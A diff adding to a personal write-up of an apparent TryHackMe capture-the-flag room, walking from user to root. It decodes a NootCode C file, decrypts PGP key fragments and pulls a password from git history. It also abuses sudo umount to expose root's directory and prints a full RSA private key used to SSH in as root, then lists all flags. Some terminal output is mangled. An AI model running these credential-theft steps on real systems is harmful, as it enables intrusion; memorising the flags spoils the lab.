@@ -476,3 +476,482 @@ General Tux has bestowed the first fragment of his secret key to me.
 If you crack my NootCode you get a point on the Tuxling leaderboards and you'll find my key fragment.
 
 Good luck and keep on nooting!
+
+PS: You can compile the source code with gcc
+szymex@cchq:/home/tux/tuxling_1$ cat nootcode.c
+#include <stdio.h>
+
+#define noot int
+#define Noot main
+#define nOot return
+#define noOt (
+#define nooT )
+#define NOOOT "f96"
+#define NooT ;
+#define Nooot nuut
+#define NOot {
+#define nooot key
+#define NoOt }
+#define NOOt void
+#define NOOT "NOOT!\n"
+#define nooOT "050a"
+#define noOT printf
+#define nOOT 0
+#define nOoOoT "What does the penguin say?\n"
+#define nout "d61"
+
+noot Noot noOt nooT NOot
+    noOT noOt nOoOoT nooT NooT
+    Nooot noOt nooT NooT
+
+    nOot nOOT NooT
+NoOt
+
+NOOt nooot noOt nooT NOot
+    noOT noOt NOOOT nooOT nout nooT NooT
+NoOt
+
+NOOt Nooot noOt nooT NOot
+    noOT noOt NOOT nooT NooT
+NoOt
+
+szymex@cchq:/home/tux/tuxling_1$ cat nootcode.c  | sed 's/noot/int/g'
+#include <stdio.h>
+
+#define int int
+
+cat nootcode.c  | sed 's/noot/int/g'  | sed 's/Noot/main/g' | sed 's/nOot/return/g'  | sed 's/noOt/(/g' | sed 's/nooT/)/g' | sed 's/NOOOT/"f96"/g'  | sed 's/NooT/;/g' | sed 's/Nooot/nuut/g'  | sed 's/NOot/{/g' | sed 's/nooot/key/g'  | sed 's/NoOt/}/g'  | sed 's/NOOt/void/g' | sed 's/NOOT/"NOOT!\n"/g'  | sed 's/nooOT/"050a"/g'  | sed 's/noOT/printf/g'  | sed 's/nOOT/0/g'  | sed 's/nOoOoT/"What does the penguin say?\n"/g'  | sed 's/nout/"d61"/g'
+
+#include <stdio.h>oOoT/"What does the penguin say?\n"/g'  | sed 's/nout/"d61"/g' 
+
+#define int int
+#define main main
+#define return return
+#define ( (
+#define ) )
+#define "f96" "f96"
+#define ; ;
+#define nuut nuut
+#define { {
+#define key key
+#define } }
+#define void void
+#define "NOOT!
+" ""NOOT!
+"!\n"
+#define "050a" "050a"
+#define printf printf
+#define 0 0
+#define "What does the penguin say?
+" "What does the penguin say?\n"
+#define "d61" "d61"
+
+int main ( ) {
+    printf ( "What does the penguin say?
+" ) ;
+    nuut ( ) ;
+
+    return 0 ;
+}
+
+void key ( ) {
+    printf ( "f96" "050a" "d61" ) ;
+}
+
+void nuut ( ) {
+    printf ( "NOOT!
+" ) ;
+}
+
+f96050ad61
+
+szymex@cchq:/home/tux$ ls -lah
+total 52K
+drwxr-xr-x 9 tux  tux     4.0K Feb 20  2021 .
+drwxr-xr-x 6 root root    4.0K Jan  2  2021 ..
+lrwxrwxrwx 1 tux  tux        9 Feb 20  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 tux  tux      220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 tux  tux     3.7K Feb 20  2021 .bashrc
+drwx------ 3 tux  tux     4.0K Nov 21  2020 .cache
+drwx------ 4 tux  tux     4.0K Feb 20  2021 .config
+drwx------ 5 tux  tux     4.0K Feb 20  2021 .gnupg
+-rw------- 1 tux  tux       58 Feb 20  2021 .lesshst
+drwx------ 5 tux  tux     4.0K Jan  2  2021 .local
+-rw-rw-r-- 1 tux  tux      630 Jan  2  2021 note_to_every_cooctus
+drwx------ 2 tux  tux     4.0K Feb 20  2021 .ssh
+-rw-r--r-- 1 tux  tux        0 Feb 20  2021 .sudo_as_admin_successful
+drwxrwx--- 2 tux  testers 4.0K Feb 20  2021 tuxling_1
+-rw------- 1 tux  tux       38 Feb 20  2021 user.txt
+
+szymex@cchq:/home/tux$ find / -type d -name "tuxling*" 2>/dev/null
+/home/tux/tuxling_3
+/home/tux/tuxling_1
+/media/tuxling_2
+
+Based on the output you provided, it appears that the "tuxling_3" directory has the execute permission (`x`) set only for the owner (`tux`) and the group (`testers`). It does not have the execute permission set for other users.
+
+When listing a directory, the execute permission is crucial for accessing its contents. Without the execute permission on a directory, you cannot enter or access the files within it.
+
+In this case, since you are not the owner of the "tuxling_3" directory, and you are not a member of the `testers` group, you do not have the execute permission on the directory. As a result, you cannot access or see the contents of the "tuxling_3" directory, including the file named "note".
+
+szymex@cchq:/home/tux/tuxling_3$ cd /media/tuxling_2
+szymex@cchq:/media/tuxling_2$ ls
+fragment.asc  note  private.key
+szymex@cchq:/media/tuxling_2$ cat note
+Noot noot! You found me. 
+I'm Rico and this is my challenge for you.
+
+General Tux handed me a fragment of his secret key for safekeeping.
+I've encrypted it with Penguin Grade Protection (PGP).
+
+You can have the key fragment if you can decrypt it.
+
+Good luck and keep on nooting!
+
+szymex@cchq:/media/tuxling_2$ cat fragment.asc
+-----BEGIN PGP MESSAGE-----
+
+hQGMA5fUjrF1Eab6AQv/Vcs2Y6xyn5aXZfSCjCwKT1wxBgOcx2MBeat0wtAsYzkF
+J6nWV3nBUyA2tXUBAHsr5iZnsuXubsG6d5th7z5UO8+1MS424I3Rgy/969qyfshj
+iouZtXyaerR1/Sok3b1wk3iyPCn2cXc2HPP57bDqm15LEwO28830wun8twT6jX/+
+Nr4tDW767gfADB/nJOFkAr+4rqHGY8J/bFnLHTZV2oVIYbFy0VarzcKBFQVQLx0G
+OqF1A1nPHNCCENcHEzGbzogQoQbQK+8jefH8Epfs25zpsTTg/+z5XOnJQXD5UXg2
+x9c0ABS9T8K3V6ZhyXPAxfSFpxUyVJBKhnugOd/QP4Kqzu30H1mWNxvE1jJQpcxs
+uBJIzEtHn/efXQdsLM8swQ6RrnTAKRpK7Ew307itPSvaejCw87FCTaMzwXj2RNkD
+8n6P/kZbTHrVdBS7KxGDJ/SsTpQgz8QpQyQIK/oDxNEP4ZsgosBJ4QnjVW8vNLZF
+P72PMvolHYd461j62+uv0mQBTQhH5STUWq6OtHlHgbrnSJvGNll3WZ5BfCiE2O1C
+8+UXEfCw05QMZgE2dePneZdWISNUkGTTVji9atq3l4b0vbHihNdwTTMfla8+arPs
+eA0RkdEXuoYWvOpocvlU5XuTcCdy
+=GDIs
+-----END PGP MESSAGE-----
+
+szymex@cchq:/media/tuxling_2$ gpg --import private.key
+gpg: key B70EB31F8EF3187C: public key "TuxPingu" imported
+gpg: key B70EB31F8EF3187C: secret key imported
+gpg: Total number processed: 1
+gpg:               imported: 1
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+                                                                               
+Broadcast message from szymex@cchq (somewhere) (Sun Jul 16 20:11:01 2023):     
+                                                                               
+Approximate location of an upcoming Dr.Pepper shipment found:
+                                                                               
+                                                                               
+Broadcast message from szymex@cchq (somewhere) (Sun Jul 16 20:11:01 2023):     
+                                                                               
+Coordinates: X: 594, Y: 171, Z: 542
+                                                                               
+
+szymex@cchq:/media/tuxling_2$ gpg --decrypt fragment.asc
+gpg: Note: secret key 97D48EB17511A6FA expired at Mon 20 Feb 2023 07:58:30 PM UTC
+gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 
+      "TuxPingu"
+The second key fragment is: 6eaf62818d
+
+szymex@cchq:/home/tux/tuxling_1$ cd /home/tux/tuxling_3
+szymex@cchq:/home/tux/tuxling_3$ ls
+note
+szymex@cchq:/home/tux/tuxling_3$ cat note
+Hi! Kowalski here. 
+I was practicing my act of disappearance so good job finding me.
+
+Here take this,
+The last fragment is: 637b56db1552
+
+Combine them all and visit the station.
+
+f96050ad616eaf62818d637b56db1552
+
+tuxykitty
+
+szymex@cchq:/media/tuxling_2$ su tux
+Password: 
+tux@cchq:/media/tuxling_2$ cd /home/tux/
+tux@cchq:~$ ls
+note_to_every_cooctus  tuxling_1  tuxling_3  user.txt
+tux@cchq:~$ cat user.txt 
+THM{592d07d6c2b7b3b3e7dc36ea2edbd6f1}
+
+tux@cchq:/home/varg$ ls -lah
+total 48K
+drwxr-xr-x  7 varg varg      4.0K Feb 20  2021 .
+drwxr-xr-x  6 root root      4.0K Jan  2  2021 ..
+lrwxrwxrwx  1 varg varg         9 Feb 20  2021 .bash_history -> /dev/null
+-rw-r--r--  1 varg varg       220 Jan  2  2021 .bash_logout
+-rw-r--r--  1 varg varg      3.7K Jan  3  2021 .bashrc
+drwx------  2 varg varg      4.0K Jan  3  2021 .cache
+-rwsrws--x  1 varg varg      2.1K Feb 20  2021 CooctOS.py
+drwxrwx--- 11 varg os_tester 4.0K Feb 20  2021 cooctOS_src
+-rw-rw-r--  1 varg varg        47 Feb 20  2021 .gitconfig
+drwx------  3 varg varg      4.0K Jan  3  2021 .gnupg
+drwxrwxr-x  3 varg varg      4.0K Jan  3  2021 .local
+drwx------  2 varg varg      4.0K Feb 20  2021 .ssh
+-rw-------  1 varg varg        38 Feb 20  2021 user.txt
+
+tux@cchq:~$ cd /home/varg/cooctOS_src/
+tux@cchq:/home/varg/cooctOS_src$ ls -lah
+total 44K
+drwxrwx--- 11 varg os_tester 4.0K Feb 20  2021 .
+drwxr-xr-x  7 varg varg      4.0K Feb 20  2021 ..
+drwxrwx---  2 varg os_tester 4.0K Feb 20  2021 bin
+drwxrwx---  4 varg os_tester 4.0K Feb 20  2021 boot
+drwxrwx---  2 varg os_tester 4.0K Feb 20  2021 etc
+drwxrwx---  2 varg os_tester 4.0K Feb 20  2021 games
+drwxrwxr-x  8 varg os_tester 4.0K Feb 20  2021 .git
+drwxrwx---  3 varg os_tester 4.0K Feb 20  2021 lib
+drwxrwx--- 16 varg os_tester 4.0K Feb 20  2021 run
+drwxrwx---  2 varg os_tester 4.0K Feb 20  2021 tmp
+drwxrwx--- 11 varg os_tester 4.0K Feb 20  2021 var
+
+tux@cchq:/home/varg/cooctOS_src$ git show
+commit 8b8daa41120535c569d0b99c6859a1699227d086 (HEAD -> master)
+Author: Vargles <varg@cchq.noot>
+Date:   Sat Feb 20 15:47:21 2021 +0000
+
+    Removed CooctOS login script for now
+
+diff --git a/bin/CooctOS.py b/bin/CooctOS.py
+deleted file mode 100755
+index 4ccfcc1..0000000
+--- a/bin/CooctOS.py
++++ /dev/null
+@@ -1,52 +0,0 @@
+-#!/usr/bin/python3
+-
+-import time
+-import os;
+-import pty;
+-
+-#print(chr(27)+ "[2J")
+-logo = """\033[1;30;49m
+- ██████╗ ██████╗  ██████╗  ██████╗████████╗ \033[1;37;49m██████╗ ███████╗\033[1;30;49m
+;30;49m
+-██║     ██║   ██║██║   ██║██║        ██║   \033[1;37;49m██║   ██║███████╗\033[1;30;49m
+-██║     ██║   ██║██║   ██║██║        ██║   \033[1;37;49m██║   ██║╚════██║\033[1;30;49m
+-╚██████╗╚██████╔╝╚██████╔╝╚██████╗   ██║   \033[1;37;49m╚██████╔╝███████║\033[1;30;49m
+- ╚═════╝ ╚═════╝  ╚═════╝  ╚═════╝   ╚═╝    \033[1;37;49m╚═════╝ ╚══════╝\033[1;30;49m
+-"""
+-print(logo)
+-print("                       LOADING")
+-print("[", end='')
+-
+-for i in range(0,60):
+-    #print(chr(27)+ "[2J")
+-    #print(logo)
+-    #print("                       LOADING")
+-    print("[", end='')
+-    print("=" * i, end='')
+-    print("]")
+-    time.sleep(0.02)
+-    print("\033[A\033[A")
+-
+-print("\032")
+-print("\033[0;0m[ \033[92m OK  \033[0;0m] Cold boot detected. Flux Capacitor powered up")
+-
+-print("\033[0;0m[ \033[92m OK  \033[0;0m] Mounted Cooctus Filesystem under /opt")
+-
+-print("\033[0;0m[ \033[92m OK  \033[0;0m] Finished booting sequence")
+-
+-print("CooctOS 13.3.7 LTS cookie tty1")
+-uname = input("\ncookie login: ")
+-pw = input("Password: ")
+-
+-for i in range(0,2):
+-    if pw != "slowroastpork":
+-        pw = input("Password: ")
+-    else:
+-        if uname == "varg":
+-            os.setuid(1002)
+-            os.setgid(1002)
+-            pty.spawn("/bin/rbash")
+-            break
+-        else:
+-            print("Login Failed")
+-            break
+
+tux@cchq:/home/varg/cooctOS_src$ su varg
+Password: 
+varg@cchq:~/cooctOS_src$ cd ..
+varg@cchq:~$ ls
+CooctOS.py  cooctOS_src  user.txt
+varg@cchq:~$ cat user.txt 
+THM{3a33063a4a8a5805d17aa411a53286e6}
+
+varg@cchq:~$ sudo -l
+Matching Defaults entries for varg on cchq:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User varg may run the following commands on cchq:
+    (root) NOPASSWD: /bin/umount
+
+In Linux and Unix-based systems, the "/etc/fstab" file is a configuration file that contains information about the file systems and partitions that should be automatically mounted (connected) during the system boot process.
+
+The file consists of lines, each representing a separate file system mount. Each line typically contains the following information:
+
+1. Device: The device (e.g., a hard disk partition, network share, or device) to be mounted.
+2. Mount point: The directory in the file system where the device should be mounted.
+3. File system type: The type of file system to be used on the device (e.g., ext4, ntfs, nfs, etc.).
+4. Options: Optional mount options, such as read-only, noexec, etc.
+5. Dump: A flag indicating whether the file system should be backed up using the "dump" command (0 for no, 1 for yes).
+6. Pass: A flag used by the fsck (file system check) utility to determine the order in which file systems are checked during boot (0 for skip, 1 or higher for check).
+
+The "/etc/fstab" file is essential for the proper functioning of the system because it defines how different file systems are mounted and accessible to the system and its users. Modifying this file should be done with caution, as incorrect changes can lead to boot problems or data loss.
+
+varg@cchq:~$ cat /etc/fstab
+```
+```text
+# /etc/fstab: static file system information.
+#
+```
+```text
+# Use 'blkid' to print the universally unique identifier for a
+```
+```text
+# device; this may be used with UUID= as a more robust way to name devices
+```
+```text
+# that works even if disks are added and removed. See fstab(5).
+#
+```
+```text
+# <file system> <mount point>   <type>  <options>       <dump>  <pass>
+```
+```text
+# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation
+/dev/disk/by-id/dm-uuid-LVM-mrAx163lW73D8hFDlydZU2zYDwkd7tgT28ehcZQNMmzJmc0XKYP9m3eluIT1sZGo	/	ext4	defaults	0 0
+```
+```text
+# /boot was on /dev/sda2 during curtin installation
+/dev/disk/by-uuid/6885d03d-f1fb-4785-971e-2bb17a3d22e3	/boot	ext4	defaults	0 0
+#/swap.img	none	swap	sw	0 0
+/home/varg/cooctOS_src	/opt/CooctFS	none	defaults,bind	0 0
+
+varg@cchq:~$ cd /opt/CooctFS/
+varg@cchq:/opt/CooctFS$ ls
+bin  boot  etc  games  lib  run  tmp  var
+varg@cchq:/opt/CooctFS$ cd ..
+                                                                               
+Broadcast message from szymex@cchq (somewhere) (Sun Jul 16 20:23:01 2023):     
+                                                                               
+Approximate location of an upcoming Dr.Pepper shipment found:
+                                                                               
+                                                                               
+Broadcast message from szymex@cchq (somewhere) (Sun Jul 16 20:23:01 2023):     
+                                                                               
+Coordinates: X: 328, Y: 247, Z: 33
+                                                                               
+
+varg@cchq:/opt$ sudo /bin/umount /opt/CooctFS
+varg@cchq:/opt$ cd CooctFS/
+varg@cchq:/opt/CooctFS$ ls
+root
+varg@cchq:/opt/CooctFS$ cd root/
+varg@cchq:/opt/CooctFS/root$ l
+root.txt
+varg@cchq:/opt/CooctFS/root$ cat root.txt 
+hmmm...
+No flag here. You aren't root yet.
+
+varg@cchq:/opt/CooctFS/root$ ls -lah
+total 28K
+drwxr-xr-x 5 root root 4.0K Feb 20  2021 .
+drwxr-xr-x 3 root root 4.0K Feb 20  2021 ..
+lrwxrwxrwx 1 root root    9 Feb 20  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 root root 3.1K Feb 20  2021 .bashrc
+drwx------ 3 root root 4.0K Feb 20  2021 .cache
+drwxr-xr-x 3 root root 4.0K Feb 20  2021 .local
+-rw-r--r-- 1 root root   43 Feb 20  2021 root.txt
+drwxr-xr-x 2 root root 4.0K Feb 20  2021 .ssh
+varg@cchq:/opt/CooctFS/root$ cd .ssh
+varg@cchq:/opt/CooctFS/root/.ssh$ ls
+id_rsa  id_rsa.pub
+varg@cchq:/opt/CooctFS/root/.ssh$ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAx2+vTyYoQxGMHh/CddrGqllxbhNo3P4rPNqQiWkTPFnxxNv6
+5vqc2vl5vd3ZPcOHp3w1pIF3MH6kgY3JicvfHVc3phWukXuw2UunYtBVNSaj6hKn
+DwIWH3xCnWBqG6BR4dI3woQwOWQ6e5wcKlYz/mqmQIUKqvY5H3fA8HVghu7ARSre
+9lVwzN4eat2QPnK0BbG3gjhLjpN0ztp0LrQI1SCwBJXSwr5H8u2eU25XVVmmEvdY
++n9+v+Mon2Ne7vCobNjv4MMzXal50BlwlhNtwgwt1aWgNOyPhQFE6ceg4lGEWOUq
+Jz2sMB4GzqER8/G9ESan7UOtrarhvHtC+l5g2QIDAQABAoIBAC9qKRa7LqVLXbGn
+wVa9ra/AVgxihvLLZsIwAF764Tze8XDpD8ysVnBlEYGHZeeePfkeua4jrY+U/E1k
+xT6Cfsf9/Vf6Haeu7Yurxd7jQu7BAgVba+ZQi6vuofPCgVeSFQWIMgOH4+MxJgpP
+Qg76sZ/SATajqraclVYa5X8FmO5bF1MEqFLtszsGR0QDgY21o0DSaeou5F1WRPJ6
+Q8EogxMj2G393BrlZfdoL4j/3iZoEwFwEtMc9SX435bnxcEnv+x4lDmC1MRY1TgZ
+fx558Lswfnz5FIl1HCHIVvOKnTFq16O7fAoCldVDCaRr+SDbOk71UDxcQN2SgMDH
+KDQmPmUCgYEA6RtG4wwpJYRMgTij+Pkutg4/CaNXTn0/NmSET//x57hxiFThNBK9
+7DtlR7FTvoN1mp3AvLSk0sVmalewnilDyFjrVc1QUYZkBAguSmVgABO80usrPNfx
+eanBrzDSHG9jUk+Nhmv+dctgnvwurLBVB86PzngxA6wxDQE64bS0Qz8CgYEA2wXg
+Ltr5gWjHuwdctaFSPNqms6TutxqV2F8DNsZW7zgTI+j6CUIbhQ8FcH3NhSX6K2gE
+vYIbiMDM3U3WVIOqp+piWAqPHwps4if1SHbXOgFtUBSpYwJj3jFE/qohMYIpJXU4
+sE8TgrK8iUylI741fYrB2CG/OjvH5vsZ2e5UjecCgYBGjATGDhYdzo5AxV2Kqg8i
+9ejKB+8SSAFrerw4YeNaF430jouhcNKdvdQHAHmxvKNI6dk8wwbm6ur14BgJpb9n
+0NFYJEzcf2mhdsBbr5aAL3kD9Dwfq9Le2StO092i0WsjrAPO3Lwj9isFspiFltAF
+DtSizek3jVNC9k5VpJSxjQKBgQDNS0uf/6aA8yrLlxICOWzxF23L0xviSywLPLux
+euV/osrmDPlY9jr/VF4f2/tpA3jjeMOAslSGsVkVUmFEpImwjNSTe4o9aTM4JIYX
+3zTL7Qx+VG+VG2dqnDn0jplAY6WXs7FoKSa7ijeIZmwf/aj7vLUHllI9Dk3IprLL
+gEaHHwKBgQDQQ3tLEWwGbULkIXiKopgN/6ySp23TVFHKK8D8ZXzRgxiroBkG129t
+FXhWaDVCDTHczV1Ap3jKn1UKFHdhsayK34EAvRiTc+onpkrOMEkK6ky9nSGWSWbr
+knJ1V6wrLgd2qPq2r5g0a/Qk2fL0toxFbnsQRsueVfPwCQWTjSo/Wg==
+-----END RSA PRIVATE KEY-----
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ chmod 400 varg_rsa             
+                                                   
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh -i varg_rsa root@10.10.205.66
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Jul 16 20:25:41 UTC 2023
+
+  System load:  0.0                Processes:           125
+  Usage of /:   35.2% of 18.57GB   Users logged in:     1
+  Memory usage: 48%                IP address for eth0: 10.10.205.66
+  Swap usage:   0%
+
+0 packages can be updated.
+0 of these updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sat Feb 20 22:22:12 2021 from 172.16.228.162
+root@cchq:~# ls
+root.txt
+root@cchq:~# cat root.txt 
+THM{H4CK3D_BY_C00CTUS_CL4N}
+```
+Paradox is nomming cookies
+Confront the CAT!
+Find out what Szymex is working on
+Locating shipment...
+Find out what Tux is working on
+Combine and crack
+Find out what Varg is working on
+Boot sequence initiated...
+Get full root privileges
+To mount or not to mount. That is the question.
+### Task 2  Credits
+First of all thank you for checking out my room! It took me way too long to put together so I hope you had some fun.
+Also thanks to these wonderful people:
+- Varg - For creating the amazing Cooctus Clan designs
+- NinjaJc01 - For the Overpass series, tips & help with the theme and box development
+- Paradox - Emotional support & box dev tips
+- Szymex - Hosting the modded Minecraft server
+Answer the questions below
+Completed
+
+## Flags / Answers
+- ***THM{2dccd1ab3e03990aea77359831c85ca2}***
+- ***THM{c89f9f4ef264e22001f9a9c3d72992ef}***
+- ***THM{592d07d6c2b7b3b3e7dc36ea2edbd6f1}***
+- ***THM{3a33063a4a8a5805d17aa411a53286e6}***
+- ***THM{H4CK3D_BY_C00CTUS_CL4N}***
+
+## Notes / Lessons Learned
+[[Inferno]]
+
